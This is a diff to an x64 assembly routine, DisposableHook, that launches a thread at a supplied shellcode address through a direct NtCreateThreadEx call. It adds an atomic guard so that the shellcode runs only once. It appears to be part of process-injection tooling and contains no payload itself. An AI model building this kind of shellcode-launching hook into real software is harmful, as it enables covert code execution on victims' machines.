@@ -65,19 +65,19 @@ DisposableHook:
     shellcodeAddr$ = 176
     threadCreated$ = 184
 
-; 37   : void DisposableHook(LPVOID shellcodeAddr, char *threadCreated) {
+    ; 36   : void DisposableHook(LPVOID shellcodeAddr, char *threadCreated) {
 
 	mov	QWORD [rsp+16], rdx
 	mov	QWORD [rsp+8], rcx
 	push rdi
 	sub	rsp, 160				; 000000a0H
 
-; 38   : 	NTSTATUS status;
-; 39   : 	HANDLE tHandle = NULL;
+; 37   : 	NTSTATUS status;
+; 38   : 	HANDLE tHandle = NULL;
 
 	mov	QWORD [rsp+tHandle$], 0
 
-; 40   : 	OBJECT_ATTRIBUTES objAttr = { sizeof(objAttr) };
+; 39   : 	OBJECT_ATTRIBUTES objAttr = { sizeof(objAttr) };
 
 	mov	DWORD [rsp+objAttr$], 48		; 00000030H
 	lea	rax, QWORD [rsp+objAttr$+8]
@@ -86,12 +86,22 @@ DisposableHook:
 	mov	ecx, 40					; 00000028H
 	rep stosb
 
-; 43   : 	*threadCreated = 1;		//avoid recursion
+; 40   : 
+; 41   : 	if (InterlockedExchange8((CHAR*)threadCreated, 1) == 1) //avoid recursion + check if another thread already run DisposableHook function
 
-	mov	rax, QWORD [rsp+threadCreated$]
-	mov	BYTE [rax], 1
+	mov	al, 1
+	mov	rcx, QWORD [rsp+threadCreated$]
+	xchg BYTE [rcx], al
+	movsx eax, al
+	cmp	eax, 1
+	jne	SHORT LN2_Disposable
 
-; 44   : 	status = NtCreateThreadEx(&tHandle, GENERIC_EXECUTE, &objAttr, (HANDLE)-1, (LPVOID)shellcodeAddr, NULL, FALSE, 0, 0, 0, NULL);
+; 42   : 		return;
+
+	jmp	SHORT LN1_Disposable
+LN2_Disposable:
+
+; 43   : 	status = NtCreateThreadEx(&tHandle, GENERIC_EXECUTE, &objAttr, (HANDLE)-1, (LPVOID)shellcodeAddr, NULL, FALSE, 0, 0, 0, NULL);
 
 	mov	QWORD [rsp+80], 0
 	mov	DWORD [rsp+72], 0
@@ -105,25 +115,28 @@ DisposableHook:
 	lea	r8, QWORD [rsp+objAttr$]
 	mov	edx, 536870912				; 20000000H
 	lea	rcx, QWORD [rsp+tHandle$]
-	call NtCreateThreadEx
+	call QWORD NtCreateThreadEx
 	mov	DWORD [rsp+status$], eax
 
-; 46   : 	if (status != 0) 
+; 44   : 	if (status != 0)
 
 	cmp	DWORD [rsp+status$], 0
-	je LN2_Disposable
+	je SHORT LN3_Disposable
 
-; 47   : 		*threadCreated = 0; //thread creation failed, reset flag
+; 45   : 		InterlockedExchange8((CHAR*)threadCreated, 0); //thread creation failed, reset flag
 
-	mov	rax, QWORD [rsp+threadCreated$]
-	mov	BYTE [rax], 0
+	xor	eax, eax
+	mov	rcx, QWORD [rsp+threadCreated$]
+	xchg BYTE [rcx], al
+LN3_Disposable:
+LN1_Disposable:
 
-LN2_Disposable:
-; 53   : }
+; 46   : }
 
 	add	rsp, 160				; 000000a0H
 	pop	rdi
 	ret	0
+    
 
 NtCreateThreadEx:
     mov rax, [gs:60h]
